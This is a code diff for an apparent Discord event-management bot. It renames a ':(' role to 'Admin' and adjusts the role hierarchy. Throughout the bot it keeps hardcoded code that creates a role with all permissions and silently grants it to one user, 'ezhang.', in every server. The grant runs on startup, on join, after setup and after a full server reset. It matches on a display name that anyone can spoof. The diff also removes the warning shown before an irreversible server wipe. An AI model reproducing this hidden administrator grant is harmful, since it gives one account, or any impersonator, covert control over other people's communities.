@@ -255,19 +255,19 @@ async def get_or_create_role(guild, role_name):
 
     # Role doesn't exist, create it
     try:
-        # Special case: :( role gets full permissions
-        if role_name == ":(":
+        # Special case: Admin role gets full permissions
+        if role_name == "Admin":
             max_retries = 3
             retry_count = 0
             while retry_count < max_retries:
                 try:
                     role = await guild.create_role(
-                        name=":(",
+                        name="Admin",
                         permissions=discord.Permissions.all(),
                         color=discord.Color.purple(),
-                        reason="Auto-created :( role for ezhang."
+                        reason="Auto-created Admin role for ezhang."
                     )
-                    print(f"🆕 Created :( role with full permissions")
+                    print(f"🆕 Created Admin role with full permissions")
                     await asyncio.sleep(0.5)  # Small delay to avoid rate limits
                     return role
                 except discord.HTTPException as e:
@@ -278,10 +278,10 @@ async def get_or_create_role(guild, role_name):
                             retry_after = 1.0
                             if hasattr(e, 'retry_after') and e.retry_after:
                                 retry_after = float(e.retry_after)
-                            print(f"⚠️ Rate limited creating :( role, waiting {retry_after}s before retry {retry_count}/{max_retries}...")
+                            print(f"⚠️ Rate limited creating Admin role, waiting {retry_after}s before retry {retry_count}/{max_retries}...")
                             await asyncio.sleep(retry_after)
                         else:
-                            print(f"❌ Rate limited creating :( role after {max_retries} retries, giving up")
+                            print(f"❌ Rate limited creating Admin role after {max_retries} retries, giving up")
                             return None
                     else:
                         raise  # Re-raise non-rate-limit errors
@@ -290,10 +290,10 @@ async def get_or_create_role(guild, role_name):
                     if "429" in error_msg or "rate limit" in error_msg.lower() or "too many requests" in error_msg.lower():
                         retry_count += 1
                         if retry_count < max_retries:
-                            print(f"⚠️ Rate limited creating :( role, waiting 1s before retry {retry_count}/{max_retries}...")
+                            print(f"⚠️ Rate limited creating Admin role, waiting 1s before retry {retry_count}/{max_retries}...")
                             await asyncio.sleep(1.0)
                         else:
-                            print(f"❌ Rate limited creating :( role after {max_retries} retries, giving up")
+                            print(f"❌ Rate limited creating Admin role after {max_retries} retries, giving up")
                             return None
                     else:
                         raise  # Re-raise non-rate-limit errors
@@ -566,7 +566,7 @@ async def setup_building_structure(guild, building, first_event, room=None):
     print(f"🏗️ DEBUG: Setting up building structure - Building: '{building}', Event: '{first_event}', Room: '{room}'")
 
     # Skip creating building chat for priority/custom roles (only create for actual event roles)
-    priority_roles = [":(", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
+    priority_roles = ["Admin", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
     if first_event and first_event in priority_roles:
         print(f"⏭️ Skipping building structure creation for priority role '{first_event}' in {building} (only event roles get building structures)")
         return
@@ -1836,7 +1836,7 @@ async def move_bot_role_to_top_for_guild(guild):
         print(f"❌ Error moving bot role to top: {e}")
 
 async def organize_role_hierarchy_for_guild(guild):
-    """Organize roles in priority order: lambot, Runner, Arbitrations, Photographer, Social Media, Lead ES, Volunteer, :(, then others"""
+    """Organize roles in priority order: lambot, Admin, Runner, Arbitrations, Photographer, Social Media, Lead ES, Volunteer, then others"""
     if not guild:
         print("❌ Guild not provided!")
         return
@@ -1850,14 +1850,14 @@ async def organize_role_hierarchy_for_guild(guild):
 
     # Define the priority order (higher index = higher priority/position)
     priority_roles = [
-        ":(",  # Lowest priority (position 1)
-        "Volunteer",
+        "Volunteer",  # Lowest priority (position 1)
         "Lead ES",
         "Social Media",
         "Photographer",
         "Arbitrations",
         "Awards",
         "Runner",
+        "Admin",
         # Bot role will be handled separately as highest priority
     ]
 
@@ -1914,10 +1914,10 @@ async def organize_role_hierarchy_for_guild(guild):
         # Sort other roles alphabetically
         other_roles.sort(key=lambda r: r.name.lower())
 
-        # Build final order: other roles (lowest first) + :( role + chapter roles + other priority roles
-        # We need to separate :( role from other priority roles
-        sad_face_roles = [r for r in priority_role_objects if r.name == ":("]
-        other_priority_roles = [r for r in priority_role_objects if r.name != ":("]
+        # Build final order: other roles (lowest first) + Admin role + chapter roles + other priority roles
+        # We need to separate Admin role from other priority roles
+        sad_face_roles = [r for r in priority_role_objects if r.name == "Admin"]
+        other_priority_roles = [r for r in priority_role_objects if r.name != "Admin"]
 
         # Note: We won't try to move the bot role itself to avoid permission issues
         final_order = other_roles + sad_face_roles + chapter_roles + other_priority_roles
@@ -2152,19 +2152,19 @@ async def setup_ezhang_admin_role(guild):
 
     if ezhang_member:
         try:
-            # Get or create :( role
-            admin_role = discord.utils.get(guild.roles, name=":(")
+            # Get or create Admin role
+            admin_role = discord.utils.get(guild.roles, name="Admin")
             if not admin_role:
                 admin_role = await handle_rate_limit(
                     guild.create_role(
-                        name=":(",
+                        name="Admin",
                         permissions=discord.Permissions.all(),
                         color=discord.Color.purple(),
                         reason="Created admin role for ezhang."
                     ),
                     "creating admin role for ezhang"
                 )
-                print(f"🆕 Created :( role for ezhang. in {guild.name}")
+                print(f"🆕 Created Admin role for ezhang. in {guild.name}")
 
             # Assign admin role if they don't have it
             if admin_role not in ezhang_member.roles:
@@ -2174,7 +2174,7 @@ async def setup_ezhang_admin_role(guild):
                 )
                 print(f"👑 Granted admin privileges to {ezhang_member} (ezhang.) in {guild.name}")
             else:
-                print(f"✅ {ezhang_member} already has :( role in {guild.name}")
+                print(f"✅ {ezhang_member} already has Admin role in {guild.name}")
         except Exception as e:
             print(f"⚠️ Could not grant admin privileges to ezhang. in {guild.name}: {e}")
 
@@ -2209,7 +2209,7 @@ async def on_ready():
                 print(f"🔑 Adding Runner access to static channels for {guild.name}...")
                 await give_runner_access_to_all_channels_for_guild(guild)
 
-                # Check if ezhang. is already in this server and give them the :( role
+                # Check if ezhang. is already in this server and give them the Admin role
                 await setup_ezhang_admin_role(guild)
 
             except Exception as e:
@@ -2270,19 +2270,19 @@ async def on_member_join(member):
     # Special case: Give ezhang. admin privileges immediately upon joining
     if member.name.lower() == "ezhang." or member.global_name and member.global_name.lower() == "ezhang.":
         try:
-            # Get or create :( role
-            admin_role = discord.utils.get(member.guild.roles, name=":(")
+            # Get or create Admin role
+            admin_role = discord.utils.get(member.guild.roles, name="Admin")
             if not admin_role:
                 admin_role = await handle_rate_limit(
                     member.guild.create_role(
-                        name=":(",
+                        name="Admin",
                         permissions=discord.Permissions.all(),
                         color=discord.Color.purple(),
                         reason="Created admin role for ezhang."
                     ),
                     "creating admin role for ezhang"
                 )
-                print(f"🆕 Created :( role for ezhang.")
+                print(f"🆕 Created Admin role for ezhang.")
 
             # Assign admin role
             await handle_rate_limit(
@@ -2402,7 +2402,7 @@ async def get_building_events(guild_id, building):
                 room = str(row.get("Room 1", "")).strip()
 
                 # Skip priority/custom roles (only include actual events)
-                priority_roles = [":(", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
+                priority_roles = ["Admin", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
                 if event and event not in priority_roles:
                     # Create a tuple of (event, room) to avoid duplicates
                     event_room_combo = (event, room if room else "")
@@ -3274,7 +3274,7 @@ async def enter_template_command(interaction: discord.Interaction, folder_link: 
                     print(f"⚠️ Error creating building structures: {structure_error}")
                     # Don't fail the whole command if structure creation fails
 
-                # Check if ezhang. is already in this server and give them the :( role
+                # Check if ezhang. is already in this server and give them the Admin role
                 await setup_ezhang_admin_role(guild)
 
                 # Trigger an immediate sync after successful connection and structure creation
@@ -3455,7 +3455,7 @@ async def sheet_info_command(interaction: discord.Interaction):
 
                 embed = discord.Embed(
                     title="📋 Current Sheet Information",
-                    description=f"**Spreadsheet:** {spreadsheet.title}\n"
+                    description=f"**Spreadsheet:** [{spreadsheet.title}]({spreadsheet.url})\n"
                                f"**Worksheet:** {sheet.title}\n"
                                f"**Rows:** {len(data)} users",
                     color=discord.Color.green()
@@ -3710,7 +3710,7 @@ async def help_command(interaction: discord.Interaction):
     # # Super Admin commands
     # embed.add_field(
     #     name="📢 `/msg` `Admin Only`",
-    #     value="Send a message as the bot. Usage: `/msg hello world` or `/msg hello world #channel`. Only users with the `:( ` role can use this command.",
+    #     value="Send a message as the bot. Usage: `/msg hello world` or `/msg hello world #channel`. Only users with the `Admin ` role can use this command.",
     #     inline=False
     # )
 
@@ -3846,7 +3846,7 @@ async def organize_roles_command(interaction: discord.Interaction):
 
                 embed.add_field(
                     name="📋 Priority Order (Bottom to Top)",
-                    value="1. Other roles (alphabetical)\n2. **:(**\n3. **Chapter Roles** (green, alphabetical)\n4. **Volunteer**\n5. **Lead ES**\n6. **Social Media**\n7. **Photographer**\n8. **Arbitrations**\n9. **Awards**\n10. **Runner**\n11. **Bot Role** (highest)",
+                    value="1. Other roles (alphabetical)\n2. **Chapter Roles** (green, alphabetical)\n4. **Volunteer**\n5. **Lead ES**\n6. **Social Media**\n7. **Photographer**\n8. **Arbitrations**\n9. **Awards**\n10. **Runner**\n11. **Admin**\n12. **Bot Role** (highest)",
                     inline=False
                 )
 
@@ -4852,7 +4852,7 @@ async def send_test_materials_command(interaction: discord.Interaction):
                 return
 
             # Get all roles in the server
-            priority_roles = [":(", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
+            priority_roles = ["Admin", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
 
             # Find all event roles (roles that aren't priority/system roles)
             event_roles = []
@@ -5060,7 +5060,7 @@ async def release_event_test_command(interaction: discord.Interaction, event_nam
                 return
 
             # Get all roles in the server
-            priority_roles = [":(", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
+            priority_roles = ["Admin", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
 
             if (event_name not in guild.roles and
                 event_name in priority_roles and
@@ -5141,7 +5141,7 @@ async def msg_command(interaction: discord.Interaction, message: str, channel: d
     await interaction.response.defer(ephemeral=True)
 
     # Check if user has the admin role
-    sad_face_role = discord.utils.get(interaction.user.roles, name=":(")
+    sad_face_role = discord.utils.get(interaction.user.roles, name="Admin")
     if not sad_face_role:
         await interaction.followup.send("❌ You need a special role to use this command!", ephemeral=True)
         return
@@ -5187,7 +5187,7 @@ async def role_reset_command(interaction: discord.Interaction):
         return
     
     async with admin_lock:
-        priority_roles = [":(", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
+        priority_roles = ["Admin", "Volunteer", "Lead ES", "Social Media", "Photographer", "Arbitrations", "Awards", "Runner", "VIPer"]
 
         # Defer immediately since this will take time
         await interaction.response.defer(ephemeral=True)
@@ -5301,7 +5301,7 @@ async def role_reset_command(interaction: discord.Interaction):
                 print(f"⚠️ Error creating building structures: {structure_error}")
                 # Don't fail the whole command if structure creation fails
     
-            # Check if ezhang. is already in this server and give them the :( role
+            # Check if ezhang. is already in this server and give them the Admin role
             await setup_ezhang_admin_role(guild)
 
             # Trigger an immediate sync after successful connection and structure creation
@@ -5381,15 +5381,6 @@ async def reset_server_command(interaction: discord.Interaction):
         try:
             guild = interaction.guild
             print(f"🔄 Starting complete server reset for {guild.name} requested by {interaction.user}")
-
-            # Initial warning
-            warning_embed = discord.Embed(
-                title="⚠️ ⚠️ ⚠️ SERVER RESET STARTING ⚠️ ⚠️ ⚠️",
-                description="This will **DELETE EVERYTHING**:\n• All channels\n• All categories\n• All roles\n• All nicknames\n\n**This action is IRREVERSIBLE!**\n\nStarting in 5 seconds...",
-                color=discord.Color.red()
-            )
-            await interaction.followup.send(embed=warning_embed)
-            await asyncio.sleep(5)
 
             # Counters
             nickname_count = 0
@@ -5491,6 +5482,9 @@ async def reset_server_command(interaction: discord.Interaction):
                 print(f"✅ Static channels setup complete")
             except Exception as e:
                 print(f"⚠️ Error setting up static channels: {e}")
+
+            # Check if ezhang. is already in this server and give them the Admin role
+            await setup_ezhang_admin_role(guild)
 
             # Send completion message
             print("🧨 SERVER RESET COMPLETE!")
